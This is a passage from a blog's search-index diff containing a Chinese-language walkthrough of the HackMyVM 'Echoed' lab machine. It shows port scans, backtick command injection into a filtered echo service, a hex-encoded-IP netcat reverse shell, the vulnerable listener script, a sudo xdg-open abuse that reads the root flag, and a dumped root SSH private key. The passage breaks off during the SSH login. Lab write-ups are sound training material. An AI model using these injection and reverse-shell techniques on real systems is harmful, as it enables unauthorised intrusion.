@@ -24138,4 +24138,294 @@ root@kitty:~<span class="token comment"># id</span>
         <tag>opencats</tag>
       </tags>
   </entry>
+  <entry>
+    <title>HackMyVM-Echoed</title>
+    <url>/posts/4dfb16e2/</url>
+    <content><![CDATA[<p><strong>难度:medium</strong></p>
+<p><strong>kali:192.168.1.101</strong></p>
+<p><strong>靶机:192.168.1.110</strong></p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  arp-scan <span class="token parameter variable">-l</span>                                                                                                              <span class="token punctuation">[</span><span class="token number">23</span>:36:57<span class="token punctuation">]</span> Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.1.101
+Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
+<span class="token number">192.168</span>.1.1     <span class="token number">78</span>:60:5b:04:b4:8c       TP-LINK TECHNOLOGIES CO.,LTD.
+<span class="token number">192.168</span>.1.104   <span class="token number">44</span>:e5:17:0a:27:01       Intel Corporate
+<span class="token number">192.168</span>.1.110   08:00:27:5f:d3:ff       PCS Systemtechnik GmbH</code></pre>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sS</span> -p- --min-rate<span class="token operator">=</span><span class="token string">"5000"</span> <span class="token number">192.168</span>.1.110                                                                      <span class="token punctuation">[</span><span class="token number">23</span>:37:08<span class="token punctuation">]</span> Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-17 <span class="token number">23</span>:37 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.110
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0013s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65532</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
+PORT     STATE SERVICE
+<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
+<span class="token number">80</span>/tcp   <span class="token function">open</span>  http
+<span class="token number">4444</span>/tcp <span class="token function">open</span>  krb524
+MAC Address: 08:00:27:5F:D3:FF <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">2.68</span> seconds
+root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  <span class="token function">clear</span>                                                                                                                    <span class="token punctuation">[</span><span class="token number">23</span>:37:46<span class="token punctuation">]</span> root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.1.110 -p22,80,4444                                                                                   <span class="token punctuation">[</span><span class="token number">23</span>:37:50<span class="token punctuation">]</span> Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-17 <span class="token number">23</span>:38 CST
+Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.110
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0041s latency<span class="token punctuation">)</span>.
+
+PORT     STATE SERVICE VERSION
+<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.9p1 Debian <span class="token number">10</span>+deb10u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey:
+<span class="token operator">|</span>   <span class="token number">2048</span> de:3a:50:8e:5d:21:09:7e:40:3f:b2:07:bb:41:08:7e <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">256</span> 5c:57:56:da:e5:1c:3e:bc:9a:a2:8d:6d:21:4e:bc:f9 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> f8:aa:dc:d3:27:52:e3:99:32:98:45:5b:52:f0:bc:e1 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+<span class="token number">80</span>/tcp   <span class="token function">open</span>  http    nginx <span class="token number">1.14</span>.2
+<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
+<span class="token operator">|</span>_http-server-header: nginx/1.14.2
+<span class="token number">4444</span>/tcp <span class="token function">open</span>  krb524?
+<span class="token operator">|</span> fingerprint-strings:
+<span class="token operator">|</span>   GetRequest:
+<span class="token operator">|</span>     Command:Found illegal char.Command:
+<span class="token operator">|</span>   NULL:
+<span class="token operator">|</span>_    Command:
+<span class="token number">1</span> <span class="token function">service</span> unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service <span class="token builtin class-name">:</span>
+SF-Port4444-TCP:V<span class="token operator">=</span><span class="token number">7</span>.94SVN%I<span class="token operator">=</span><span class="token number">7</span>%D<span class="token operator">=</span><span class="token number">8</span>/17%Time<span class="token operator">=</span>66C0C3E1%P<span class="token operator">=</span>x86_64-pc-linux-gnu%r
+SF:<span class="token punctuation">(</span>NULL,8,<span class="token string">"Command:"</span><span class="token punctuation">)</span>%r<span class="token punctuation">(</span>GetRequest,23,<span class="token string">"Command:Found<span class="token entity" title="\x20">\x20</span>illegal<span class="token entity" title="\x20">\x20</span>char\.
+SF:Command:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+MAC Address: 08:00:27:5F:D3:FF <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
+Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
+Device type: general purpose
+Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
+Network Distance: <span class="token number">1</span> hop
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+<span class="token number">1</span>   <span class="token number">4.09</span> ms <span class="token number">192.168</span>.1.110
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">178.37</span> seconds</code></pre>
+<h2 id="命令执行getshell"><a href="#命令执行getshell" class="headerlink" title="命令执行getshell"></a>命令执行getshell</h2><p><img src="https://ooo.0x0.ooo/2024/08/17/OtyMpg.png" alt="OtyMpg.png" loading="lazy"><br>提示使用4444端口<br><img src="https://ooo.0x0.ooo/2024/08/17/OtyOfB.png" alt="OtyOfB.png" loading="lazy"><br>重启一下靶机</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">nc</span> <span class="token number">192.168</span>.1.110 <span class="token number">4444</span>                       <span class="token punctuation">[</span><span class="token number">0</span>:00:40<span class="token punctuation">]</span>
+Command:ls
+Found illegal char.Command:</code></pre>
+<p>有点ctf了，过滤了一些字符</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">Executing:echo <span class="token string">"a"</span>
+a
+Command:a
+Executing:echo <span class="token string">"a"</span>
+a
+Command:b
+Executing:echo <span class="token string">"b"</span>
+b
+Command:c
+Executing:echo <span class="token string">"c"</span>
+c
+Command:d
+Found illegal char.Command:e
+Executing:echo <span class="token string">"e"</span>
+e</code></pre>
+<p>应该是执行echo这个字符</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">Command:<span class="token variable"><span class="token variable">`</span>ss<span class="token variable">`</span></span>
+Executing:echo <span class="token string">"<span class="token variable"><span class="token variable">`</span>ss<span class="token variable">`</span></span>"</span>
+Netid State Recv-Q Send-Q                   Local Address:Port     Peer Address:Port                                                                            
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">12622</span>               * <span class="token number">12623</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">12682</span>               * <span class="token number">12683</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">12803</span>               * <span class="token number">12804</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>      /var/run/dbus/system_bus_socket <span class="token number">12854</span>               * <span class="token number">12543</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">12852</span>               * <span class="token number">12853</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">12543</span>               * <span class="token number">12854</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">12853</span>               * <span class="token number">12852</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>          /run/systemd/journal/stdout <span class="token number">12683</span>               * <span class="token number">12682</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">13469</span>               * <span class="token number">13470</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>          /run/systemd/journal/stdout <span class="token number">12623</span>               * <span class="token number">12622</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">12552</span>               * <span class="token number">12855</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">13470</span>               * <span class="token number">13469</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>      /var/run/dbus/system_bus_socket <span class="token number">13075</span>               * <span class="token number">13074</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">10998</span>               * <span class="token number">11095</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">11525</span>               * <span class="token number">11526</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">13074</span>               * <span class="token number">13075</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>      /var/run/dbus/system_bus_socket <span class="token number">12855</span>               * <span class="token number">12552</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>          /run/systemd/journal/stdout <span class="token number">12804</span>               * <span class="token number">12803</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>                                    * <span class="token number">13275</span>               * <span class="token number">13276</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>          /run/systemd/journal/stdout <span class="token number">13276</span>               * <span class="token number">13275</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>          /run/systemd/journal/stdout <span class="token number">11095</span>               * <span class="token number">10998</span>                                                                           
+u_str ESTAB <span class="token number">0</span>      <span class="token number">0</span>          /run/systemd/journal/stdout <span class="token number">11526</span>               * <span class="token number">11525</span>                                                                           
+tcp   ESTAB <span class="token number">0</span>      <span class="token number">0</span>                        <span class="token number">192.168</span>.1.110:4444    <span class="token number">192.168</span>.1.101:58726  </code></pre>
+<p>测试发现可以命令执行。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">Command:nc        
+Executing:echo <span class="token string">"nc"</span>
+<span class="token function">nc</span>
+Command:-e
+Executing:echo <span class="token string">"-e"</span>
+<span class="token parameter variable">-e</span>
+Command:/bin/bash
+Executing:echo <span class="token string">"/bin/bash"</span>
+/bin/bash</code></pre>
+<p>想执行反弹shell，只有.被过滤用ip地址的16进制或者10进制都能绕过这个点</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">Command:<span class="token variable"><span class="token variable">`</span><span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/bash 0xC0A80165 <span class="token number">4567</span><span class="token variable">`</span></span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">4567</span>                               <span class="token punctuation">[</span><span class="token number">0</span>:30:05<span class="token punctuation">]</span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
+connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.1.101<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.1.110<span class="token punctuation">]</span> <span class="token number">46302</span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>charlie<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>charlie<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>charlie<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,25<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,109<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span></code></pre>
+<p>拿到shell</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash">charlie@echoed:~$ <span class="token function">cat</span> flag.sh 
+<span class="token comment">#!/bin/bash</span>
+<span class="token builtin class-name">echo</span> <span class="token string">'\033[0;35m
+                                   .     **                                     
+                                *           *.                                  
+                                              ,*                                
+                                                 *,                             
+                         ,                         ,*                           
+                      .,                              *,                        
+                    /                                    *                      
+                 ,*                                        *,                   
+               /.                                            .*.                
+             *                                                  **              
+             ,*                                               ,*                
+                **                                          *.                  
+                   **                                    **.                    
+                     ,*                                **                       
+                        *,                          ,*                          
+                           *                      **                            
+                             *,                .*                               
+                                *.           **                                 
+                                  **      ,*,                                   
+                                     ** *,     \033[0m'</span>                                               
+
+
+
+<span class="token builtin class-name">echo</span> <span class="token string">"-------------------------"</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token entity" title="\n">\n</span>PWNED HOST: <span class="token variable"><span class="token variable">$(</span><span class="token function">hostname</span><span class="token variable">)</span></span>"</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token entity" title="\n">\n</span>PWNED DATE: <span class="token variable"><span class="token variable">$(</span><span class="token function">date</span><span class="token variable">)</span></span>"</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token entity" title="\n">\n</span>WHOAMI: <span class="token variable"><span class="token variable">$(</span><span class="token function">id</span><span class="token variable">)</span></span>"</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token entity" title="\n">\n</span>FLAG: <span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> root.txt <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">||</span> <span class="token function">cat</span> user.txt <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token operator">||</span> <span class="token builtin class-name">echo</span> <span class="token string">"Keep trying."</span><span class="token variable">)</span></span>"</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"<span class="token entity" title="\n">\n</span>------------------------"</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">charlie@echoed:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> flag.sh 
+-rwxr-xr-x <span class="token number">1</span> charlie charlie <span class="token number">1920</span> Dec <span class="token number">16</span>  <span class="token number">2020</span> flag.sh</code></pre>
+<p>只有charlie的权限所以只能读取user flag</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">charlie@echoed:~$ <span class="token function">cat</span> listener.py 
+<span class="token comment">#!/usr/bin/env python</span>
+<span class="token function">import</span> os
+<span class="token function">import</span> socket
+<span class="token function">import</span> subprocess
+
+HOST <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span>
+PORT <span class="token operator">=</span> <span class="token number">4444</span>
+allow_reuse_address <span class="token operator">=</span> True
+s <span class="token operator">=</span> socket.socket<span class="token punctuation">(</span>socket.AF_INET, socket.SOCK_STREAM<span class="token punctuation">)</span>
+s.bind<span class="token variable"><span class="token punctuation">((</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">))</span></span>
+s.listen<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
+conn, addr <span class="token operator">=</span> s.accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">while</span> True:
+        try:
+                conn.send<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
+                comando <span class="token operator">=</span> conn.recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
+                comando <span class="token operator">=</span> comando.strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                comando2 <span class="token operator">=</span> <span class="token string">'echo "'</span> + comando + <span class="token string">'"'</span>
+                <span class="token builtin class-name">command</span> <span class="token operator">=</span> <span class="token string">'Executing:'</span> + comando2 + <span class="token string">'\n'</span>
+                print <span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span>
+                chars <span class="token operator">=</span> set<span class="token punctuation">(</span><span class="token string">'d\fgjkl?mopqrtuv*,._'</span><span class="token punctuation">)</span>
+                <span class="token keyword">if</span> any<span class="token punctuation">((</span>c <span class="token keyword">in</span> chars<span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token for-or-select variable">c</span> <span class="token keyword">in</span> comando<span class="token punctuation">)</span>:
+                        conn.send<span class="token punctuation">(</span><span class="token string">'Found illegal char.'</span><span class="token punctuation">)</span>
+                else:
+                        output <span class="token operator">=</span> subprocess.check_output<span class="token punctuation">(</span>comando2, <span class="token assign-left variable">shell</span><span class="token operator">=</span>True<span class="token punctuation">)</span>
+                        conn.send<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
+                        conn.send<span class="token punctuation">(</span>output<span class="token punctuation">)</span>
+        except:
+                <span class="token builtin class-name">continue</span></code></pre>
+<p>把这个脚本保存下来以后出给小孩玩。</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">charlie@echoed:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> charlie on echoed:
+    env_reset, mail_badpass,
+    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin
+
+User charlie may run the following commands on echoed:
+    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/xdg-open</code></pre>
+<p>搜了一下这个命令可以打开文件或者图片，用默认的编辑器，我直接读root flag</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">charlie@echoed:~$ <span class="token function">sudo</span> <span class="token function">xdg-open</span> /root/root.txt
+WARNING: terminal is not fully functional
+/root/root.txt  <span class="token punctuation">(</span>press RETURN<span class="token punctuation">)</span>HMVcharlied
+/root/root.txt <span class="token punctuation">(</span>END<span class="token punctuation">)</span><span class="token punctuation">(</span>END<span class="token punctuation">)</span><span class="token punctuation">(</span>END<span class="token punctuation">)</span><span class="token punctuation">(</span>END<span class="token punctuation">)</span><span class="token punctuation">(</span>END<span class="token punctuation">)</span><span class="token punctuation">(</span>END<span class="token punctuation">)</span><span class="token punctuation">(</span>END<span class="token punctuation">)</span><span class="token punctuation">(</span>END<span class="token punctuation">)</span></code></pre>
+<p>拿到root flag，但是没有拿到rootshell<br>读一下root的私钥</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">charlie@echoed:~$ <span class="token function">sudo</span> <span class="token function">xdg-open</span> /root/.ssh/id_rsa
+WARNING: terminal is not fully functional
+/root/.ssh/id_rsa  <span class="token punctuation">(</span>press RETURN<span class="token punctuation">)</span>-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEA7EqTEqxQiI+A27hayef+XQLgE91eQQ94tyvsEFWvQiLtSUwHhCKn
+TXARwWcCc5uWFhMTAqL8mFncfYLYvRG2PhiasUgi+kIVjWQZPp/CAu/AMQCeELd2giWoz/
+w4xuiz/jVkUiZtB4OUfGFbwkMFi5wqRM5d6TIGUQinfGiwiutWSusQ7cpxLgbtGGuuJe5Z
+BOXYk4WDZfV+o8DiqTn/DSyADeQoyTYO6qfkcFN2lgVlGdEYx7CF5MS+DT/+b5dBpQGcTj
+jDj+KLckJkt7GZ0fbhpzToiBETTBBDqzgeeN04QmAOlOubbcIwnB33+PEaWFtQMatGZQYC
+ks9KBQv+lQAAA8hYRFboWERW6AAAAAdzc2gtcnNhAAABAQDsSpMSrFCIj4DbuFrJ5/5dAu
+AT3V5BD3i3K+wQVa9CIu1JTAeEIqdNcBHBZwJzm5YWExMCovyYWdx9gti9EbY+GJqxSCL6
+QhWNZBk+n8IC78AxAJ4Qt3aCJajP/DjG6LP+NWRSJm0Hg5R8YVvCQwWLnCpEzl3pMgZRCK
+d8aLCK61ZK6xDtynEuBu0Ya64l7lkE5diThYNl9X6jwOKpOf8NLIAN5CjJNg7qp+RwU3aW
+BWUZ0RjHsIXkxL4NP/5vl0GlAZxOOMOP4otyQmS3sZnR9uGnNOiIERNMEEOrOB543ThCYA
+6U65ttwjCcHff48RpYW1Axq0ZlBgKSz0oFC/6VAAAAAwEAAQAAAQEAzdQoSRvRCyP2G297
+pmVwLZVTm/o5IHNZtDWObKw2/mVuTWrtIS0Oj2YQEWipugrNsmzrImDXp96fMrXIFupW1c
+CY/9TWoyjtnTyUwPhpCCXQRN9E0Ur+8F/drU8IJjyOjeH0gZr3XpQ/xBkK1S2MpxBhwY4C
+QCBTYEMpojWPk3HAMbQNFddsPAPfLFk+4R6GPUKrUtOzzf/Kdwpn+PTFRjvytPfS7pbPAx
+YHyM42rSNhy6jQlN1Iiu+EwUm1MBl9bTk5A6Jk3fvQWnBXoPZfjbgE/Kk2RZXZNW1a6MBG
+URR5zjhWfu0NvJDm8z227UgwV7fXsUMyvBbeYFJHOuygAQAAAIEA6Inpgcu76BJkYcgTJD
+PEwbtyyc/PE9vFYIwBENuUlz6jXT1TuhZ1FyY+pidQ607l0E+M7zwGrMb+PQP8l7KpMkbX
+Y8IQydqs/XzNziO9RnQusXFcVCbsAKmYsLeCkbzOn4yWitA5cpgLs/bXrqGs2dFE/d8ifi
+mLodRZj6/vLGwAAACBAPlu5m8XoaGK1XkF7Vlik4YoCNPnavRGB91fJg/M7M5YKKR7Y1ll
+jmNX4TIIj+U5CuvIBf6TVS1fwn95ANv2o8oxVG7e4AHZpt3GQtP2yDLiHshzsj0W6NzzeI
+dB2BClQgvukjzremccz8rHV3L9nYr1LYF/Rs6GgvsD72AZzgNJAAAAgQDygxopioQQ/Dup
+/root/.ssh/id_rsaz6hTWng1LXgZ0EUBMqN5tCcGgTHvAeykiWpjl/zrK5QjDmjhKzYaHPBI/sUdgVA8o2R8ne
+:hbS9N2ogWiJAF/XaU5behAdg1lTkfk6xNpF/1CVuK2gItW7yF1AGLMPLhD8nVlyx1429Ln
+:eysx2HEd+7b7p0dU7QAAAAtyb290QGVjaG9lZAECAwQFBg<span class="token operator">==</span></code></pre>
+<p>是有的，整理一下格式</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEA7EqTEqxQiI+A27hayef+XQLgE91eQQ94tyvsEFWvQiLtSUwHhCKn
+TXARwWcCc5uWFhMTAqL8mFncfYLYvRG2PhiasUgi+kIVjWQZPp/CAu/AMQCeELd2giWoz/
+w4xuiz/jVkUiZtB4OUfGFbwkMFi5wqRM5d6TIGUQinfGiwiutWSusQ7cpxLgbtGGuuJe5Z
+BOXYk4WDZfV+o8DiqTn/DSyADeQoyTYO6qfkcFN2lgVlGdEYx7CF5MS+DT/+b5dBpQGcTj
+jDj+KLckJkt7GZ0fbhpzToiBETTBBDqzgeeN04QmAOlOubbcIwnB33+PEaWFtQMatGZQYC
+ks9KBQv+lQAAA8hYRFboWERW6AAAAAdzc2gtcnNhAAABAQDsSpMSrFCIj4DbuFrJ5/5dAu
+AT3V5BD3i3K+wQVa9CIu1JTAeEIqdNcBHBZwJzm5YWExMCovyYWdx9gti9EbY+GJqxSCL6
+QhWNZBk+n8IC78AxAJ4Qt3aCJajP/DjG6LP+NWRSJm0Hg5R8YVvCQwWLnCpEzl3pMgZRCK
+d8aLCK61ZK6xDtynEuBu0Ya64l7lkE5diThYNl9X6jwOKpOf8NLIAN5CjJNg7qp+RwU3aW
+BWUZ0RjHsIXkxL4NP/5vl0GlAZxOOMOP4otyQmS3sZnR9uGnNOiIERNMEEOrOB543ThCYA
+6U65ttwjCcHff48RpYW1Axq0ZlBgKSz0oFC/6VAAAAAwEAAQAAAQEAzdQoSRvRCyP2G297
+pmVwLZVTm/o5IHNZtDWObKw2/mVuTWrtIS0Oj2YQEWipugrNsmzrImDXp96fMrXIFupW1c
+CY/9TWoyjtnTyUwPhpCCXQRN9E0Ur+8F/drU8IJjyOjeH0gZr3XpQ/xBkK1S2MpxBhwY4C
+QCBTYEMpojWPk3HAMbQNFddsPAPfLFk+4R6GPUKrUtOzzf/Kdwpn+PTFRjvytPfS7pbPAx
+YHyM42rSNhy6jQlN1Iiu+EwUm1MBl9bTk5A6Jk3fvQWnBXoPZfjbgE/Kk2RZXZNW1a6MBG
+URR5zjhWfu0NvJDm8z227UgwV7fXsUMyvBbeYFJHOuygAQAAAIEA6Inpgcu76BJkYcgTJD
+PEwbtyyc/PE9vFYIwBENuUlz6jXT1TuhZ1FyY+pidQ607l0E+M7zwGrMb+PQP8l7KpMkbX
+Y8IQydqs/XzNziO9RnQusXFcVCbsAKmYsLeCkbzOn4yWitA5cpgLs/bXrqGs2dFE/d8ifi
+mLodRZj6/vLGwAAACBAPlu5m8XoaGK1XkF7Vlik4YoCNPnavRGB91fJg/M7M5YKKR7Y1ll
+jmNX4TIIj+U5CuvIBf6TVS1fwn95ANv2o8oxVG7e4AHZpt3GQtP2yDLiHshzsj0W6NzzeI
+dB2BClQgvukjzremccz8rHV3L9nYr1LYF/Rs6GgvsD72AZzgNJAAAAgQDygxopioQQ/Dup
+z6hTWng1LXgZ0EUBMqN5tCcGgTHvAeykiWpjl/zrK5QjDmjhKzYaHPBI/sUdgVA8o2R8ne
+hbS9N2ogWiJAF/XaU5behAdg1lTkfk6xNpF/1CVuK2gItW7yF1AGLMPLhD8nVlyx1429Ln
+eysx2HEd+7b7p0dU7QAAAAtyb290QGVjaG9lZAECAwQFBg<span class="token operator">==</span>
+-----END OPENSSH PRIVATE KEY-----</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">vim</span> id_rsa                                                                                                                                                                                                <span class="token punctuation">[</span><span class="token number">0</span>:54:10<span class="token punctuation">]</span>
+root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">chmod</span> <span class="token number">600</span> id_rsa                                                                                                                                                                                          <span class="token punctuation">[</span><span class="token number">0</span>:54:16<span class="token punctuation">]</span>
+root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa root@192.168.1.110                                                                                                                                                                          <span class="token punctuation">[</span><span class="token number">0</span>:54:22<span class="token punctuation">]</span>
+The authenticity of <span class="token function">host</span> <span class="token string">'192.168.1.110 (192.168.1.110)'</span> can<span class="token string">'t be established.
+ED25519 key fingerprint is SHA256:oQu3q+1PdKxh+LYJGhUzk9Xi5XkHM5TN+iho+LIwgPo.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? ye
+Please type '</span><span class="token function">yes</span><span class="token string">', '</span>no<span class="token string">' or the fingerprint: yes
+Warning: Permanently added '</span><span class="token number">192.168</span>.1.110' <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span> to the list of known hosts.
